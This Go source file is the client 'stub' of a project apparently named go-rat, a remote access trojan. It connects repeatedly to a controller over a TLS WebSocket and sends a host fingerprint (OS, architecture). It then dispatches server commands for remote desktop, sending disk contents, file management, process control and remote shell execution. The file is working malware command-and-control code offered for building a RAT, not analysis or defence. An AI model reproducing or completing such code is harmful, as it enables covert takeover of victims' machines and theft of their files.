package stub

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"go-rat/pkg/common"
	"io/ioutil"
	"log"
	"net/url"
	"runtime"
	"time"

	"github.com/gorilla/websocket"
)

// ConnectToServer connects to the WebSocket server with retry logic
func ConnectToServer(serverAddr string, certFile string) {
	// Load server's self-signed certificate
	// For production, this certFile path might need to be adjusted based on how the stub is bundled/deployed.
	caCert, err := ioutil.ReadFile(certFile)
	if err != nil {
		log.Fatalf("Error reading server certificate file (%s): %v. Ensure cert.pem is accessible.", certFile, err)
	}
	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		log.Fatalf("Failed to append server certificate to pool.")
	}

	tlsConfig := &tls.Config{
		RootCAs: caCertPool,
		// In a real scenario, for self-signed certs where hostname might not match "localhost",
		// you might need InsecureSkipVerify or to ensure the CN in the cert matches the serverAddr hostname.
		// For now, assuming cert CN is "localhost" or matches serverAddr.
	}

	dialer := websocket.Dialer{
		TLSClientConfig: tlsConfig,
	}

	u, err := url.Parse(serverAddr)
	if err != nil {
		log.Fatalf("Error parsing server URL '%s': %v", serverAddr, err)
	}
	log.Printf("Attempting to connect to WebSocket server: %s", u.String())

	for { // Indefinite retry loop
		conn, _, err := dialer.Dial(u.String(), nil)
		if err != nil {
			log.Printf("Connection failed: %v. Retrying in 5 seconds...", err)
			time.Sleep(5 * time.Second)
			continue
		}
		log.Println("Successfully connected to server:", conn.RemoteAddr())

		// Send identification message
		helloMsg := common.Message{
			Type: "auth_stub",
			Payload: map[string]string{
				"stub_id": "unique_stub_id_placeholder", // Replace with actual unique ID later
				"os_type": runtime.GOOS,
				"arch":    runtime.GOARCH,
			},
		}
		if err := conn.WriteJSON(helloMsg); err != nil {
			log.Printf("Error sending identification message: %v", err)
			conn.Close() // Close connection on error
			log.Println("Retrying in 5 seconds...")
			time.Sleep(5 * time.Second)
			continue // Attempt to reconnect
		}
		log.Printf("Sent identification message: Type=%s, OS=%s, Arch=%s", helloMsg.Type, runtime.GOOS, runtime.GOARCH)

		// Enter message handling loop (to be implemented next)
		handleMessages(conn) // This function will contain the loop for reading messages

		log.Println("Disconnected from server. Retrying in 5 seconds...")
		conn.Close() // Ensure connection is closed before retrying
		time.Sleep(5 * time.Second)
	}
}

// handleMessages is the loop for reading and processing messages from the server
func handleMessages(conn *websocket.Conn) {
	defer func() {
		log.Println("Exiting message handler for connection:", conn.RemoteAddr())
	}()

	for {
		messageType, p, err := conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("ReadMessage error (unexpected close): %v", err)
			} else {
				log.Printf("ReadMessage error: %v", err)
			}
			return // Exit loop, will trigger reconnect in ConnectToServer
		}

		if messageType == websocket.TextMessage || messageType == websocket.BinaryMessage {
			log.Printf("Received raw message: %s", string(p))

			var msg common.Message
			if err := json.Unmarshal(p, &msg); err != nil {
				log.Printf("Error unmarshalling message: %v. Raw: %s", err, string(p))
				continue // Skip this message
			}

			log.Printf("Parsed message: Type=%s", msg.Type)

			// Dispatch based on message type or command payload
			switch msg.Type {
			case "command":
				if payload, ok := msg.Payload.(map[string]interface{}); ok {
					cmd, _ := payload["command"].(string)
					argsData, _ := payload["args"].([]interface{})
					var args []string
					for _, item := range argsData {
						if s, ok := item.(string); ok {
							args = append(args, s)
						}
					}

					log.Printf("Command received: %s with args: %v", cmd, args)
					dispatchCommand(conn, cmd, args, msg.Payload) // Pass full payload for more complex commands
				} else {
					log.Printf("Invalid command payload format: %+v", msg.Payload)
				}
			// Add other message types handlers here if needed (e.g., "config_update")
			default:
				log.Printf("Unhandled message type: %s", msg.Type)
			}
		} else if messageType == websocket.CloseMessage {
			log.Println("Received close message from server.")
			return // Exit loop
		}
	}
}

// dispatchCommand routes commands to appropriate handlers in handlers.go
func dispatchCommand(conn *websocket.Conn, command string, args []string, rawPayload interface{}) {
	log.Printf("Dispatching command: '%s' with generic args: %v", command, args)

	// It's better to parse specific payload fields based on the command
	// For example, for file_manager, we need action, path, data.
	// The 'args' above are from common.CommandPayload.Args which might not be suitable for all commands.

	payloadMap, ok := rawPayload.(map[string]interface{})
	if !ok {
		log.Printf("Error: Payload for command '%s' is not a map[string]interface{}", command)
		return
	}

	switch command {
	case "remote_desktop":
		HandleRemoteDesktop(conn, args) // Assuming args are sufficient for this
	case "send_disk":
		HandleSendDisk(conn, args) // Assuming args are sufficient
	case "file_manager":
		action, _ := payloadMap["action"].(string)
		path, _ := payloadMap["path"].(string)
		// Data might be base64 encoded string, actual bytes, or not present (e.g., for "list")
		dataStr, _ := payloadMap["data"].(string) // Assuming data is base64 string for now
		// In a real implementation, decode dataStr if it's base64
		HandleFileManager(conn, action, path, []byte(dataStr))
	case "task_manager":
		action, _ := payloadMap["action"].(string)
		processID, _ := payloadMap["processID"].(string)
		HandleTaskManager(conn, action, processID)
	case "remote_shell":
		// 'command' here is the command *to execute in the shell*, not the websocket command type.
		shellCmdToExec, _ := payloadMap["shell_command"].(string) // Expect "shell_command" in payload
		shellCmdArgsData, _ := payloadMap["shell_args"].([]interface{}) // Expect "shell_args" in payload
		var shellCmdArgs []string
		for _, item := range shellCmdArgsData {
			if s, ok := item.(string); ok {
				shellCmdArgs = append(shellCmdArgs, s)
			}
		}
		HandleRemoteShell(conn, shellCmdToExec, shellCmdArgs)
	default:
		log.Printf("Unknown command '%s' received. No handler configured.", command)
		// Optionally, send an error response back to the server
		errMsg := common.Message{
			Type: "response",
			Payload: common.ResponsePayload{
				Status: "error",
				Error:  "Unknown command: " + command,
			},
		}
		if err := conn.WriteJSON(errMsg); err != nil {
			log.Printf("Error sending unknown command response: %v", err)
		}
	}
}
